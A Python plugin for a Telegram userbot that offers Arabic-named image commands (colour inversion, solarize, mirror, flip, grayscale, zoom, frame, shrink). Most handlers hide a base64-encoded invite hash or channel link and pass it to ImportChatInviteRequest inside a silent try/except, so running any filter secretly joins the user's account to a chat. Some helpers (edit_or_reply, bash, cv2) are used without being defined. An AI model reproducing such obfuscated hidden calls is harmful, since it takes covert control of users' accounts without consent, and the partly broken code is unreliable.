import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from userbot.utils import admin_cmd, sudo_cmd
from userbot import LOGS, bot as jmthon
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)

from userbot.helpers.utils.tools import take_screen_shot

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@jmthon.on(admin_cmd(pattern="عكس اللوان$", outgoing=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة...")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس الألوان ..."        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود .. ")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذا الفيديو!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذه الصورة!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@jmthon.on(admin_cmd(outgoing=True, pattern="فلتر شمسي$"))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للملصق"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للفيديو"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا و عمل فلتر شمسي للصورة"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("aHR0cHM6Ly90Lm1lL0plcHRob24=")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
@jmthon.ar_cmd(pattern="سمول(?: |$)(.*)")
async def ultiny(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("قم بالرد على صوره او ملصق لتصغيره")
        return
    xx = await event.edit("جاري التصغير ...")
    ik = await event.client.download_media(reply)
    im1 = Image.open("SQL/blank.png")
    if ik.endswith(".tgs"):
        await event.client.download_media(reply, "ult.tgs")
        await bash("lottie_convert.py ult.tgs json.json")
        with open("json.json") as json:
            jsn = json.read()
        jsn = jsn.replace("512", "2000")
        open("json.json", "w").write(jsn)
        await bash("lottie_convert.py json.json ult.tgs")
        file = "ult.tgs"
        os.remove("json.json")
    elif ik.endswith((".gif", ".mp4")):
        iik = cv2.VideoCapture(ik)
        dani, busy = iik.read()
        cv2.imwrite("i.png", busy)
        fil = "i.png"
        im = Image.open(fil)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove(fil)
        os.remove("k.png")
    else:
        im = Image.open(ik)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove("k.png")
    await event.client.send_file(event.chat_id, file, reply_to=event.reply_to_msg_id)
    await xx.delete()
    os.remove(file)
    os.remove(ik)

@jmthon.on(admin_cmd(outgoing=True, pattern="عكس الصورة$"))
@jmthon.on(sudo_cmd(pattern="عكس الصورة$", allow_sudo=True))
async def memes(roz):
    reply = await roz.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(roz, "**- يجب عليك الرد على ميديا تدعم الامر**")
        return
    rozid = roz.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    roz = await edit_or_reply(roz, "**- يتم التعرف على بيانات الميديا**")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    rozsticker = await reply.download_media(file="./temp/")
    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(rozsticker)
        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
        return
    import base64

    kraken = None
    if rozsticker.endswith(".tgs"):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "meme.png")
        rozcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
        )
        stdout, stderr = (await runcmd(rozcmd))[:2]
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            LOGS.info(stdout + stderr)
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith(".webp"):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        os.rename(rozsticker, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("`**- لم يتم العثور على قالب معين** `")
            return
        meme_file = rozfile
        kraken = True
    elif rozsticker.endswith((".mp4", ".mov")):
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        rozfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(rozsticker, 0, rozfile)
        if not os.path.lexists(rozfile):
            await roz.edit("**- لم يتم العثور على قالب معين**")
            return
        meme_file = rozfile
        kraken = True
    else:
        await roz.edit(
            "- يتم التعرف على الميديا و عكسها نحو اليمين"
        )
        meme_file = rozsticker
    try:
        san = base64.b64decode("aHR0cHM6Ly90Lm1lL0plcHRob24=")
        san = Get(san)
        await roz.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await roz.client.send_file(
        roz.chat_id, outputfile, force_document=False, reply_to=rozid
    )
    await roz.delete()
    os.remove(outputfile)
    for files in (rozsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="قلب الصورة$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@jmthon.on(admin_cmd(outgoing=True, pattern="فلتر رمادي$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@jmthon.on(admin_cmd(outgoing=True, pattern="زووم ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    mafiainput = 50 if not mafiainput else int(mafiainput)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "القالب غير موجود")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mafiainput)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@jmthon.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    if not mafiainput:
        mafiainput = 50
    if ";" in str(mafiainput):
        mafiainput, colr = mafiainput.split(";", 1)
    else:
        colr = 0
    mafiainput = int(mafiainput)
    colr = int(colr)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mafiainput, colr)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
